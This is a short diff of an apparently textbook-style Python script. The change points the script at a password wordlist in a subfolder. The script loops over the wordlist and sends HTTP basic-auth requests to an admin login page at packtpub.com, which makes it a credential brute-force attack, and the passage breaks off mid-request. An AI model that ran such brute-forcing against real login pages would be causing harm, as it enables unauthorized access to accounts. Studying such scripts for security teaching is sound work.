@@ -1,7 +1,7 @@
 import requests
 from requests.auth import HTTPBasicAuth
 
-with open("cain.txt") as passwords:
+with open("./wordlists/cain.txt") as passwords:
     for password in passwords:
         password = password.strip()
         req = requests.get('http://packtpub.com/admin_login.html',
